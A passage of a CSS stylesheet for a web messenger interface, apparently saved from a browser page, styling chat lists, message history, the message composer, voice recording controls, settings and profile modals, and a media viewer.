.im_dialogs_col .nano > .nano-pane > .nano-slider {
  background: rgba(30, 85, 127, 0.3);
  margin: 0 5px;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
}
.im_history_col_wrap {
  float: left;
  width: 69%;
}
.im_history_scrollable_wrap {
  /* Hardware acceleration in Safari */
}
.im_history_col .nano > .nano-pane,
.contacts_modal_col .nano > .nano-pane,
.sessions_modal_col .nano > .nano-pane,
.stickerset_modal_col .nano > .nano-pane,
.im_dialogs_modal_col .nano > .nano-pane {
  background: rgba(216, 223, 225, 0.45);
  /*45% d8dfe5*/
  width: 9px;
  right: 0;
  top: 0;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  -webkit-transition: none;
  -moz-transition: none;
  -o-transition: none;
  transition: none;
}
.contacts_modal_col .nano > .nano-pane {
  width: 5px;
  right: 4px;
  top: 10px;
}
.sessions_modal_col .nano > .nano-pane,
.stickerset_modal_col .nano > .nano-pane {
  top: 4px;
  bottom: 4px;
  width: 5px;
  right: 4px;
}
.im_dialogs_modal_col .nano > .nano-pane {
  width: 6px;
  right: 2px;
  top: 10px;
}
.im_history_col .nano > .nano-pane {
  top: 10px;
  right: 8px;
}
.im_history_col .nano > .nano-pane > .nano-slider,
.contacts_modal_col .nano > .nano-pane > .nano-slider,
.sessions_modal_col .nano > .nano-pane > .nano-slider,
.stickerset_modal_col .nano > .nano-pane > .nano-slider,
.im_dialogs_modal_col .nano > .nano-pane > .nano-slider {
  background: rgba(137, 160, 179, 0.5);
  /*50% 89a0b3*/
  margin: 0;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
}
.reply_markup_scrollable_container .nano > .nano-pane {
  background: rgba(137, 160, 179, 0.1);
  right: 2px;
  width: 3px;
  top: 0;
  bottom: 0;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
}
.reply_markup_scrollable_container .nano > .nano-pane > .nano-slider {
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  background: #d1d1d1;
  background: rgba(137, 160, 179, 0.5);
  margin: 0;
}
.im_history_no_dialogs_wrap {
  margin: 122px 170px 60px;
  text-align: center;
}
.im_history_appending {
  -webkit-transition: all ease-in-out 0.2s;
  -moz-transition: all ease-in-out 0.2s;
  -ms-transition: all ease-in-out 0.2s;
  -o-transition: all ease-in-out 0.2s;
  transition: all ease-in-out 0.2s;
}
.im_history_typing_wrap {
  line-height: 18px;
  width: 100%;
  height: 39px;
  overflow: hidden;
  -webkit-user-select: none;
}
.im_history_typing {
  font-size: 11px;
  color: #999;
  max-width: 556px;
  margin: 0 auto;
  padding: 13px 81px 8px 85px;
}
.im_history_typing a.im_history_typing_author {
  color: #999;
  font-weight: bold;
}
.im_history_loading_less {
  margin-top: 5px;
}
/* Contacts modal */
.contacts_modal_window .modal-dialog {
  max-width: 420px;
}
.contacts_modal_members_list {
  padding-top: 10px;
}
.contacts_modal_members_list a.contacts_modal_contact {
  padding: 8px 16px;
}
.contacts_modal_members_list .active a.contacts_modal_contact,
.contacts_modal_members_list .active a.contacts_modal_contact:hover {
  background: #6490b1;
  color: #fff;
}
.contacts_modal_members_list .active a.contacts_modal_contact .md_modal_list_peer_description,
.contacts_modal_members_list .active a.contacts_modal_contact:hover .md_modal_list_peer_description,
.contacts_modal_members_list .active a.contacts_modal_contact .md_modal_list_peer_description .status_online {
  color: #fff;
}
.session_terminate_btn {
  opacity: 0;
}
.sessions_modal_session:hover .session_terminate_btn {
  opacity: 1;
}
/* Messages edit panel */
.im_edit_delete_btn,
.im_edit_forward_btn,
.im_edit_reply_btn,
.im_start_btn {
  border-radius: 2px;
  padding: 7px 17px;
  font-weight: bold;
  font-size: 12px;
  line-height: 18px;
  margin: 6px 0 6px 14px;
}
.im_edit_panel_wrap {
  padding: 0px 0 41px;
  margin: 0 24px 0 12px;
}
.im_edit_panel_border {
  display: block;
  margin: 0 0 42px 3px;
  border-bottom: 1px solid #EEE;
}
.im_edit_cancel_link {
  display: block;
  padding: 7px 17px;
  border-radius: 2px;
  overflow: hidden;
  margin: 6px 6px;
  float: right;
}
.im_edit_selected_actions {
  text-align: left;
  text-transform: uppercase;
}
.im_edit_start_actions {
  text-align: center;
  text-transform: uppercase;
}
.im_start_btn {
  padding: 7px 25px;
}
.im_selected_count {
  color: #b9cfe3;
}
.im_submit {
  color: #499dd9;
  font-size: 13px;
  line-height: 18px;
  height: 18px;
  border-radius: 0;
  float: right;
  min-width: 0;
  margin-top: 5px;
  margin-left: 10px;
  width: auto;
  padding: 0;
  font-weight: bold;
}
.im_submit:hover {
  color: #3589c5;
  background: inherit;
}
.im_submit_edit_label,
.im_submit_edit .im_submit_send_label {
  display: none;
}
.im_submit_edit .im_submit_edit_label {
  display: inline;
}
.composer_emoji_panel {
  display: block;
  height: 30px;
  overflow: hidden;
  max-width: 210px;
}
.composer_emoji_panel a.composer_emoji_btn {
  display: inline-block;
  padding: 5px;
  outline: 0;
  border-radius: 2px;
  margin: -1px 0 2px -1px;
}
.im_message_selected .im_message_date,
.im_message_selected .im_message_document_size,
.im_message_selected .im_message_audio_duration,
.im_message_selected .im_message_audio_size,
.im_message_selected .im_message_fwd_date,
.im_message_selected .im_message_author_admin,
.im_message_selected .im_message_views_cnt,
.im_message_selected .im_message_sign_link,
.im_history_select_active .im_message_outer_wrap:hover .im_message_date,
.im_history_select_active .im_message_outer_wrap:hover .im_message_document_size,
.im_history_select_active .im_message_outer_wrap:hover .im_message_audio_duration,
.im_history_select_active .im_message_outer_wrap:hover .im_message_audio_size,
.im_history_select_active .im_message_outer_wrap:hover .im_message_fwd_date,
.im_history_select_active .im_message_outer_wrap:hover .im_message_author_admin,
.im_history_select_active .im_message_outer_wrap:hover .im_message_views_cnt,
.im_history_select_active .im_message_outer_wrap:hover .im_message_sign_link {
  color: #899daf;
}
.icon-select-tick {
  display: none;
}
.im_dialogs_modal_list .im_dialog_wrap .im_dialog .icon-select-tick {
  display: block;
  margin: 10px 5px 0 -5px;
  position: relative;
  float: left;
  width: 26px;
  height: 26px;
  background-image: /*savepage-url=../img/icons/IconsetW.png*/ url();
  background-repeat: no-repeat;
  background-position: -9px -481px;
  opacity: 0.5;
}
.is_2x .im_dialogs_modal_list .im_dialog_wrap .im_dialog .icon-select-tick {
  background-image: /*savepage-url=../img/icons/IconsetW_2x.png*/ url();
  background-size: 42px 1171px;
}
.im_dialogs_modal_list .im_dialog_wrap:hover .im_dialog .icon-select-tick {
  opacity: 0.75;
}
.icon-select-tick.dialog_selected {
  opacity: 1 !important;
}
@media (min-width: 900px) {
  .im_message_wrap {
    position: relative;
  }
  .im_message_selected .icon-select-tick,
  .im_history_selectable .im_message_outer_wrap:hover .icon-select-tick {
    position: absolute;
    width: 26px;
    height: 26px;
    margin: 9px 0 0 -59px;
    display: block;
    background-image: /*savepage-url=../img/icons/IconsetW.png*/ url();
    background-repeat: no-repeat;
    background-position: -9px -481px;
    opacity: 0.5;
  }
  .is_2x .im_message_selected .icon-select-tick,
  .is_2x .im_history_selectable .im_message_outer_wrap:hover .icon-select-tick {
    background-image: /*savepage-url=../img/icons/IconsetW_2x.png*/ url();
    background-size: 42px 1171px;
  }
  .im_message_selected .icon-select-tick {
    opacity: 1 !important;
  }
  .im_grouped_short .icon-select-tick,
  .im_grouped_short .im_message_outer_wrap:hover .icon-select-tick {
    margin-top: -2px;
  }
  .im_message_fwd .icon-select-tick,
  .im_message_outer_wrap:hover .im_message_fwd .icon-select-tick {
    margin-top: 10px;
  }
  .im_grouped_fwd .icon-select-tick,
  .im_grouped_fwd .im_message_outer_wrap:hover .icon-select-tick {
    margin-top: 7px;
  }
  .im_grouped .icon-select-tick,
  .im_grouped .im_message_outer_wrap:hover .icon-select-tick {
    margin-top: 7px;
  }
  .im_grouped_fwd_short .icon-select-tick,
  .im_grouped_fwd_short .im_message_outer_wrap:hover .icon-select-tick {
    margin-top: -5px;
  }
}
.icon-message-status {
  pointer-events: none;
  background: #4eabf1;
  border: 0;
  display: block;
  width: 10px;
  height: 10px;
  border-radius: 7px;
  position: absolute;
  margin-left: -26px;
  margin-top: 16px;
  opacity: 0;
}
.im_message_unread .icon-message-status {
  opacity: 1;
}
.im_message_pending .icon-message-status {
  opacity: 0.5;
}
.im_grouped_short .icon-message-status {
  margin-top: 5px;
}
.im_message_fwd .icon-message-status {
  margin-top: 16px;
}
.im_grouped_fwd .icon-message-status {
  margin-top: 13px;
}
.im_grouped .icon-message-status {
  margin-top: 13px;
}
.im_grouped_fwd_short .icon-message-status {
  margin-top: 2px;
}
/* Dialogs modal */
.peer_select_window .modal-dialog {
  max-width: 420px;
}
.peer_select_modal_footer {
  padding: 15px 10px 15px;
  -webkit-box-shadow: 0 -1px 0px rgba(0, 0, 0, 0.05);
  -moz-box-shadow: 0 -1px 0px rgba(0, 0, 0, 0.05);
  box-shadow: 0 -1px 0px rgba(0, 0, 0, 0.05);
}
.peer_select_modal_recipients_wrap {
  padding: 6px 0 0 10px;
  white-space: nowrap;
  max-width: 300px;
  overflow: hidden;
  text-overflow: ellipsis;
}
.peer_select_modal_recipients_empty,
.peer_select_modal_recipients_name {
  color: #999;
}
.peer_select_modal_recipient {
  display: inline-block;
  white-space: nowrap;
  max-width: 120px;
  overflow: hidden;
  text-overflow: ellipsis;
  vertical-align: bottom;
}
a.peer_select_modal_share_link {
  color: #999 !important;
}
@media (max-height: 600px), (max-width: 1010px) {
  .im_page_wrap {
    border-bottom: 0;
    border-radius: 0;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
  }
  .footer_wrap {
    display: none;
  }
}
.im_message_fwd_author_wrap {
  margin: 1px 0 4px;
  display: inline-block;
}
.im_message_fwd_author {
  margin-right: 5px;
}
.im_message_fwd .im_message_fwd_author_wrap,
.im_message_fwd .im_message_text,
.im_message_fwd .im_message_media,
.im_message_fwd .im_message_sign {
  margin-left: 52px;
}
.im_send_panel_wrap {
  max-width: 554px;
  padding-bottom: 21px;
}
.im_send_form {
  max-width: 382px;
  left: 70px;
  right: 72px;
}
.im_panel_peer_photo,
.im_panel_own_photo {
  width: 52px;
  height: 52px;
  line-height: 52px;
  border-radius: 50%;
  overflow: hidden;
}
div.im_panel_peer_photo,
a.im_panel_peer_photo {
  cursor: pointer;
  margin-left: 20px;
  height: 55px;
}
a.im_panel_own_photo {
  display: block;
  margin-right: 18px;
}
a.im_panel_own_photo .peer_initials,
div.im_panel_peer_photo .peer_initials,
a.im_panel_peer_photo .peer_initials {
  font-size: 18px;
  line-height: 50px;
}
.im_panel_peer_online {
  background: #6ec26d;
  border: 2px solid #fff;
  display: block;
  width: 14px;
  height: 14px;
  border-radius: 7px;
  overflow: hidden;
  position: absolute;
  margin-top: -12px;
  margin-left: 36px;
}
.composer_emoji_insert_btn,
.composer_progress_icon_wrap,
.composer_command_btn,
.composer_keyboard_btn {
  z-index: 1;
}
.composer_emoji_insert_btn:hover .icon-emoji {
  opacity: 1;
}
.composer_emoji_insert_btn:active .icon-emoji,
.composer_emoji_insert_btn.composer_emoji_insert_btn_on .icon-emoji {
  background-position: -9px -367px;
  opacity: 1;
}
.im_send_field_wrap {
  margin-bottom: 13px;
  padding-bottom: 2px;
  overflow-x: hidden;
}
.composer_rich_textarea,
.composer_textarea {
  overflow: none;
  overflow-y: scroll;
  border-radius: 0;
  border: 0;
  box-shadow: none;
  outline: none;
  box-shadow: 0 1px 0 0 #e8e8e8;
  padding: 1px 28px 1px 0;
  position: relative;
  margin: 0;
  min-height: 52px;
  line-height: 20px;
  height: auto;
  box-sizing: border-box;
}
.composer_rich_textarea:focus,
.composer_textarea:focus {
  border: 0;
  box-shadow: none;
  outline: none;
  box-shadow: 0 2px 0 0 #77b7e4;
}
.im_send_field_wrap_2ndbtn .composer_rich_textarea,
.im_send_field_wrap_2ndbtn .composer_textarea {
  padding-right: 65px;
}
.icon-paperclip {
  display: inline-block;
  width: 18px;
  height: 17px;
  vertical-align: top;
  opacity: 0.8;
  margin: 0;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -11px -455px;
}
.is_2x .icon-paperclip {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.im_attach {
  cursor: pointer;
  display: block;
  overflow: hidden;
  position: relative;
  width: 18px;
  height: 17px;
  margin-right: 28px;
  margin-top: 6px;
}
.im_attach:hover .icon-paperclip {
  opacity: 1;
}
.im_attach:active .icon-paperclip {
  background-position: -11px -482px;
  opacity: 1;
}
.im_media_attach {
  cursor: pointer;
  display: block;
  overflow: hidden;
  position: relative;
  padding: 0;
  width: 20px;
  height: 18px;
  margin-top: 5px;
  margin-right: 25px;
}
.icon-camera {
  display: inline-block;
  width: 20px;
  height: 18px;
  vertical-align: top;
  opacity: 0.8;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -10px -399px;
}
.is_2x .icon-camera {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.im_media_attach:hover .icon-camera {
  opacity: 1;
}
.im_media_attach:active .icon-camera {
  background-position: -10px -427px;
  opacity: 1;
}
.im_record {
  display: none;
  width: 18px;
  height: 23px;
  margin-right: 15px;
  user-select: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  -ms-user-select: none;
  position: relative;
}
.im_record_supported .im_record {
  display: block;
}
.im_record_bg {
  position: absolute;
  margin: -10px 0 0 -16px;
  padding: 13px 16px 13px 16px;
  width: 50px;
  height: 50px;
  border-radius: 50px;
  overflow: hidden;
  background: #fff;
  transition: background-color linear 0.2s;
}
.im_send_form_hover .im_voice_recording .im_record_bg {
  background: #cae9ff;
}
.icon-mic {
  display: inline-block;
  width: 18px;
  height: 22px;
  vertical-align: text-top;
  opacity: 0.8;
  background-image: /*savepage-url=../img/icons/IconsetW.png*/ url();
  background-repeat: no-repeat;
  background-position: -12px -285px;
  background-color: transparent;
}
.is_2x .icon-mic {
  background-image: /*savepage-url=../img/icons/IconsetW_2x.png*/ url();
  background-size: 42px 1171px;
}
.im_record:hover .icon-mic {
  opacity: 1;
}
.im_record:active .icon-mic,
.im_voice_recording .icon-mic {
  background-position: -12px -705px;
}
.im_voice_recorder_wrap {
  padding: 17px 10px 0;
  display: none;
  position: absolute;
}
.im_voice_recording .im_voice_recorder_wrap,
.im_processing_recording .im_voice_recorder_wrap {
  display: block;
}
.im_voice_recording .composer_rich_textarea,
.im_processing_recording .composer_rich_textarea,
.im_voice_recording .im_message_field,
.im_processing_recording .im_message_field,
.im_voice_recording .composer_emoji_insert_btn,
.im_processing_recording .composer_emoji_insert_btn,
.im_voice_recording .composer_progress_icon_wrap,
.im_processing_recording .composer_progress_icon_wrap,
.im_voice_recording .composer_command_btn,
.im_processing_recording .composer_command_btn,
.im_voice_recording .composer_keyboard_btn,
.im_processing_recording .composer_keyboard_btn,
.im_voice_recording .im_inline_placeholder_wrap,
.im_processing_recording .im_inline_placeholder_wrap {
  visibility: hidden;
}
@media (max-height: 600px) {
  a.im_panel_peer_photo,
  a.im_panel_own_photo {
    display: none;
  }
  .im_send_field_wrap {
    margin-bottom: 0;
  }
  .composer_rich_textarea,
  .composer_textarea {
    min-height: 27px;
    padding-right: 25px;
  }
  .composer_progress_icon_wrap {
    top: 0;
    right: 0;
    margin-top: 0;
  }
  .composer_emoji_insert_btn {
    top: 0;
    right: 0px;
    margin-top: -1px;
  }
  .composer_command_btn {
    top: 2px;
    right: 35px;
  }
  .composer_keyboard_btn {
    top: 2px;
    right: 35px;
  }
  .composer_emoji_panel {
    display: none;
  }
  .im_submit {
    position: absolute;
    top: 0;
    left: 100%;
    margin: 0 0 0 15px;
  }
  .im_record_supported .im_send_form_empty .im_submit {
    display: none;
  }
  .im_media_attach {
    position: absolute;
    top: -6px;
    left: -43px;
    width: 19px;
    height: 24px;
  }
  .icon-camera {
    display: inline-block;
    width: 19px;
    height: 23px;
    vertical-align: text-top;
    opacity: 0.8;
    margin-top: -1px;
    background-image: /*savepage-url=../img/icons/IconsetW.png*/ url();
    background-repeat: no-repeat;
    background-position: -12px -68px;
  }
  .is_2x .icon-camera {
    background-image: /*savepage-url=../img/icons/IconsetW_2x.png*/ url();
    background-size: 42px 1171px;
  }
  .im_media_attach:hover .icon-camera,
  .im_media_attach:active .icon-camera {
    background-position: -12px -100px;
    opacity: 1;
  }
  .im_attach {
    display: none;
    position: absolute;
    top: 0;
    right: 100%;
    margin: 0;
    margin-right: 45px;
    margin-top: 1px;
  }
  .icon-emoji {
    display: inline-block;
    width: 22px;
    height: 22px;
    vertical-align: text-top;
    opacity: 1;
    margin: 0;
    background-image: /*savepage-url=../img/icons/IconsetW.png*/ url();
    background-repeat: no-repeat;
    background-position: -10px -771px;
  }
  .is_2x .icon-emoji {
    background-image: /*savepage-url=../img/icons/IconsetW_2x.png*/ url();
    background-size: 42px 1171px;
  }
  .composer_emoji_insert_btn:active .icon-emoji,
  .is_1x .composer_emoji_insert_btn:active .icon-emoji,
  .composer_emoji_insert_btn.composer_emoji_insert_btn_on .icon-emoji,
  .is_1x .composer_emoji_insert_btn.composer_emoji_insert_btn_on .icon-emoji {
    background-position: -10px -803px;
  }
  .im_edit_panel_wrap {
    padding-bottom: 8px;
  }
  .im_edit_panel_border {
    margin-bottom: 7px;
  }
  .im_send_dropbox_wrap {
    padding-top: 5px;
    padding-bottom: 5px;
  }
  .im_record {
    display: none;
    position: absolute;
    top: 5px;
    right: -56px;
    margin-top: -8px;
  }
  .im_record_supported .im_send_form_empty .im_record {
    display: block;
  }
  .im_voice_recorder_wrap {
    padding-top: 4px;
  }
}
.im_edit_panel_wrap.im_edit_small_panel_wrap {
  padding-bottom: 8px;
}
.im_edit_small_panel_wrap .im_edit_panel_border {
  margin-bottom: 7px;
}
/* Peer modals */
.user_modal_window .modal-dialog {
  max-width: 480px;
}
.user_modal_photo_profile_wrap {
  padding: 13px 12px;
  margin-bottom: 15px;
}
.user_modal_image_wrap {
  display: block;
  width: 100px;
  margin-right: 22px;
  overflow: hidden;
  border-radius: 3px;
}
.user_modal_image {
  width: 100px;
  height: 100px;
}
.user_modal_header {
  font-weight: bold;
  margin: 2px 0 7px;
}
.user_modal_status {
  color: #999;
  margin-bottom: 15px;
}
.modal_section_body dt {
  font-weight: normal;
  display: inline-block;
  width: 100px;
}
.modal_section_body dd {
  display: inline-block;
}
.user_modal_main_btn {
  border: 0;
  font-size: 12px;
  padding-left: 16px;
  padding-right: 16px;
  margin: 8px 10px 0 0;
  float: left;
}
.user_modal_other_btn {
  margin: 8px 0 0 0;
  float: left;
}
.user_modal_other_btn .dropdown-toggle {
  border: 0;
  font-size: 12px;
}
.user_modal_other_btn .dropdown-menu {
  margin-left: -3px;
}
.user_modal_settings_wrap {
  margin-top: 25px;
}
.user_modal_notifications {
  font-weight: bold;
}
.user_modal_clear {
  margin-top: 20px;
}
.chat_modal_window .modal-dialog {
  max-width: 480px;
}
.chat_modal_header {
  font-weight: bold;
  margin: 0 0 10px;
}
.chat_modal_members_count {
  color: #999;
  margin-bottom: 16px;
}
.chat_modal_actions_wrap {
  float: right;
  position: relative;
  width: 332px;
}
.chat_modal_actions_wrap > button,
.chat_modal_actions_wrap > .chat_modal_other_btn > button,
.chat_modal_actions_wrap > span.btn {
  padding: 7px 10px;
}
.chat_modal_main_btn {
  border: 0;
  font-size: 12px;
  padding-left: 16px;
  padding-right: 16px;
  float: left;
  position: relative;
  overflow: hidden;
  margin-right: 10px;
  margin-top: 8px;
}
.chat_modal_invite_btn {
  border: 0;
  font-size: 12px;
  padding-left: 16px;
  padding-right: 16px;
  float: left;
  position: relative;
  margin-right: 10px;
  margin-top: 8px;
}
.chat_modal_delete_btn {
  border: 0;
  font-size: 12px;
  padding-left: 16px;
  padding-right: 16px;
  float: left;
  margin-right: 10px;
  margin-top: 8px;
}
.chat_modal_other_btn {
  margin-top: 8px;
  float: left;
}
.chat_modal_other_btn .dropdown-toggle {
  border: 0;
  font-size: 12px;
}
.chat_modal_other_btn .dropdown-menu {
  margin-left: -3px;
}
.chat_modal_photo_update_link {
  display: block;
  padding: 5px 14px;
  clear: both;
  font-weight: normal;
  line-height: 1.42857143;
  color: #333333;
  white-space: nowrap;
  font-size: 13px;
  overflow: hidden;
  position: relative;
}
.chat_modal_photo_update_link:hover {
  text-decoration: none;
  color: #262626;
  background-color: #f5f5f5;
}
.chat_modal_settings_wrap {
  margin-top: 10px;
}
.settings_modal_window .modal-dialog {
  max-width: 480px;
}
.settings_modal_settings {
  padding: 4px 0;
  margin: 0;
}
.settings_modal_wrap .user_modal_main_btn {
  position: relative;
  overflow: hidden;
}
.settings_profile_edit_form {
  margin-bottom: 15px;
}
.settings_profile_image_wrap {
  float: left;
  width: 120px;
  margin-right: 22px;
}
.settings_profile_first_name,
.settings_profile_last_name {
  width: 180px;
  float: left;
  margin-bottom: 0;
}
.settings_profile_first_name label,
.settings_profile_last_name label {
  margin-bottom: 3px;
}
.settings_profile_first_name {
  margin-right: 22px;
  margin-bottom: 10px;
}
.settings_profile_last_name {
  margin-right: 10px;
  margin-bottom: 15px;
}
.settings_profile_save {
  padding-top: 21px;
  float: left;
}
.settings_profile_save_btn {
  width: 50px;
}
.settings_profile_edit_form {
  margin-bottom: 0;
}
.settings_profile_edit_form input {
  font-size: 12px;
  line-height: normal;
  background: #f2f2f2;
  border: 1px solid #f2f2f2;
  border-radius: 0;
  padding: 6px 6px 6px 6px;
  margin-bottom: 0;
  margin: 0;
}
.settings_profile_edit_form input:focus,
.settings_profile_edit_form input:active {
  background-color: #fff;
}
.settings_send_choose_form input {
  margin-top: 2px;
}
.settings_send_choose_form {
  margin-bottom: 20px;
}
.settings_user_phone,
.settings_version {
  color: #999;
}
.modal_section_body dl.settings_modal_language {
  margin: 3px 0;
}
.modal_section_body dl.settings_modal_language dt {
  padding-top: 2px;
}
.settings_modal_language_select {
  font-size: 12px;
  height: 21px;
  line-height: 21px;
  padding: 0;
}
a.settings_modal_content_settings_wrap {
  margin-top: -5px;
}
.icon-volume-outer {
  display: inline-block;
  background: #c7c7c7;
  border-radius: 10px;
  overflow: hidden;
  height: 18px;
  padding: 5px 8px;
  margin: 0 9px 0 0;
  width: 32px;
}
.icon-volume-inner {
  display: block;
  background: #fff;
  float: left;
  width: 2px;
  vertical-align: bottom;
  margin: 0 1px 0;
  height: 8px;
}
.icon-volume-inner1 {
  height: 2px;
  margin-top: 6px;
}
.icon-volume-inner2 {
  height: 4px;
  margin-top: 4px;
}
.icon-volume-inner3 {
  height: 6px;
  margin-top: 2px;
}
.icon-volume-outer1 .icon-volume-inner2,
.icon-volume-outer1 .icon-volume-inner3,
.icon-volume-outer1 .icon-volume-inner4,
.icon-volume-outer2 .icon-volume-inner3,
.icon-volume-outer2 .icon-volume-inner4,
.icon-volume-outer3 .icon-volume-inner4 {
  display: none;
}
.settings_volume_slider {
  width: 100%;
  max-width: 362px;
  display: inline-block;
}
.im_message_selected .im_message_outer_wrap {
  background: #f2f6fa;
}
.im_history_selectable .im_message_outer_wrap {
  cursor: pointer;
}
.im_history_select_active .im_message_outer_wrap:hover {
  background: #f2f6fa;
}
.im_message_wrap {
  max-width: 560px;
  padding: 0 15px 0 15px;
  margin: 0 auto;
  position: static;
}
.im_content_message_wrap {
  margin: 8px 10px 8px 16px;
}
.im_message_views_wrap {
  width: 0;
}
.im_grouped .im_message_views_wrap,
.im_grouped_short .im_message_views_wrap,
.im_grouped_fwd .im_message_views_wrap,
.im_grouped_fwd_short .im_message_views_wrap {
  display: none;
}
.im_message_selected.im_grouped .im_message_views_wrap,
.im_message_selected.im_grouped_short .im_message_views_wrap,
.im_message_selected.im_grouped_fwd .im_message_views_wrap,
.im_message_selected.im_grouped_fwd_short .im_message_views_wrap {
  display: block;
}
.im_message_selected.im_grouped .im_message_views_wrap,
.im_message_selected.im_grouped_fwd .im_message_views_wrap {
  width: auto;
}
.im_message_views {
  right: 0;
  font-size: 0.85em;
  top: 3px;
}
.im_grouped .im_message_views,
.im_grouped_fwd .im_message_views {
  top: 19px;
}
.im_message_fwd .im_message_views {
  top: 3px;
}
.im_grouped_short .im_content_message_wrap {
  margin: 6px 10px 6px 16px;
}
.im_grouped_short:last-child .im_content_message_wrap {
  margin-bottom: 8px;
}
@media (min-width: 901px) {
  .im_message_wrap {
    position: relative;
  }
}
.im_message_author {
  margin: 1px 0 4px;
  display: inline-block;
}
/* Groupings */
.im_message_fwd_from {
  margin-top: 5px;
}
.im_grouped .im_message_fwd_from {
  margin-top: 0;
}
.im_message_fwd {
  margin-top: 4px;
  margin-bottom: 4px;
}
.im_grouped_short .im_message_author_wrap,
.im_grouped_short .im_message_from_photo,
.im_grouped .im_message_author_wrap,
.im_grouped .im_message_from_photo,
.im_grouped_fwd .im_message_author_wrap,
.im_grouped_fwd .im_message_from_photo,
.im_grouped_fwd_short .im_message_author_wrap,
.im_grouped_fwd_short .im_message_from_photo {
  display: none;
}
.im_grouped_short .im_message_body,
.im_grouped .im_message_body,
.im_grouped_fwd .im_message_body,
.im_grouped_fwd_short .im_message_body {
  margin-left: 57px;
}
.im_grouped_fwd .im_message_fwd_from,
.im_grouped_fwd_short .im_message_fwd_from {
  display: none;
}
.im_grouped_short .im_message_fwd .im_message_meta,
.im_grouped .im_message_fwd .im_message_meta,
.im_grouped_fwd .im_message_fwd .im_message_meta,
.im_grouped_fwd_short .im_message_fwd .im_message_meta {
  display: none;
}
.im_grouped_fwd_short .im_message_fwd {
  margin-top: 8px;
}
.tooltip-inner {
  background: rgba(0, 0, 0, 0.8);
}
.tooltip-arrow {
  opacity: 0.8;
}
.im_dialogs_scrollable_wrap a.im_dialog {
  padding: 7px 16px;
}
.im_dialogs_scrollable_wrap .active a.im_dialog {
  margin-right: -2px;
  padding-right: 18px;
}
.im_dialog_photo {
  width: 48px;
  height: 48px;
  border-radius: 50%;
  overflow: hidden;
}
div.im_dialog_photo {
  margin-right: 15px;
}
div.im_dialog_photo .peer_initials {
  line-height: 48px;
  font-size: 18px;
}
.im_dialog_message {
  margin-top: 5px;
}
.im_dialog_peer {
  margin-top: 3px;
  margin-bottom: 3px;
}
.active .im_dialog_date,
.active a.im_dialog:hover .im_dialog_date,
.active a.im_dialog_selected .im_dialog_date {
  color: #fff;
}
/* Import contact modal */
.import_contact_modal_window .modal-dialog {
  max-width: 480px;
}
.modal-content-animated {
  -webkit-transition: margin-top linear 0.2s;
  transition: margin-top linear 0.2s;
}
.countries_modal_search {
  padding: 12px 12px 12px;
  margin: 0;
  position: relative;
}
.countries_modal_col {
  max-height: 350px;
}
.countries_modal_wrap .md_modal_body {
  padding-bottom: 15px;
}
.modal_close {
  width: 20px;
  height: 21px;
  float: right;
  margin: 43px 40px 0 0;
  opacity: 0.5;
  pointer-events: none;
  -webkit-transition: 0.2s;
  -moz-transition: 0.2s;
  -o-transition: 0.2s;
  transition: 0.2s;
  background-image: /*savepage-url=../img/icons/PhotoIcons.png*/ url();
  background-repeat: no-repeat;
  background-position: -10px -10px;
}
.is_2x .modal_close {
  background-image: /*savepage-url=../img/icons/PhotoIcons_2x.png*/ url();
  background-size: 40px 200px;
}
.modal_close_wrap {
  display: none;
  cursor: pointer;
  position: fixed;
  top: 0;
  right: 0;
  width: 50%;
  height: 100%;
}
.modal_close_wrap:hover .modal_close {
  opacity: 1;
}
.modal_close_wrap_wnext {
  width: 104px;
  height: 150px;
}
.modal_prev_wrap,
.modal_next_wrap {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  bottom: 64px;
  width: 104px;
}
.modal_next_wrap {
  left: auto;
  right: 0;
}
.modal_prev,
.modal_next {
  width: 16px;
  height: 24px;
  opacity: 0.15;
  position: absolute;
  top: 50%;
  pointer-events: none;
  margin: 0 0 0 38px;
  -webkit-transition: 0.2s;
  -moz-transition: 0.2s;
  -o-transition: 0.2s;
  transition: 0.2s;
  background-image: /*savepage-url=../img/icons/PhotoIcons.png*/ url();
  background-repeat: no-repeat;
  background-position: -12px -41px;
}
.is_2x .modal_prev,
.is_2x .modal_next {
  background-image: /*savepage-url=../img/icons/PhotoIcons_2x.png*/ url();
  background-size: 40px 200px;
}
.modal_next {
  margin: 0 0 0 50px;
  background-position: -14px -75px;
}
.modal_prev_active_wrap {
  cursor: pointer;
}
.modal_prev_active_wrap .modal_prev {
  opacity: 0.5;
}
.modal_prev_active_wrap:hover {
  background-color: rgba(0, 0, 0, 0.2);
}
.modal_prev_active_wrap:hover .modal_prev {
  opacity: 1;
}
.modal_next_active_wrap {
  cursor: pointer;
}
.modal_next_active_wrap .modal_next {
  opacity: 0.5;
}
.modal_next_active_wrap:hover {
  background-color: rgba(0, 0, 0, 0.2);
}
.modal_next_active_wrap:hover .modal_next {
  opacity: 1;
}
@media (min-width: 800px) {
  .modal_close_wrap,
  .modal_next_wrap,
  .modal_prev_wrap {
    display: block;
  }
}
.media_modal_bottom_panel {
  max-width: 1000px;
  margin: 0 auto;
  color: rgba(255, 255, 255, 0.6);
  position: relative;
}
.media_modal_bottom_panel_wrap {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  height: 64px;
  background: #313131;
}
.media_modal_title_wrap {
  max-width: 300px;
  margin: 0 auto;
  text-align: center;
  font-size: 13px;
  font-weight: bold;
  line-height: 16px;
  padding: 24px 0;
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
.media_modal_info_wrap {
  line-height: 16px;
  padding: 15px 16px;
  width: 200px;
  position: absolute;
  left: 0;
}
.media_modal_author_photo {
  width: 32px;
  height: 32px;
  border-radius: 50%;
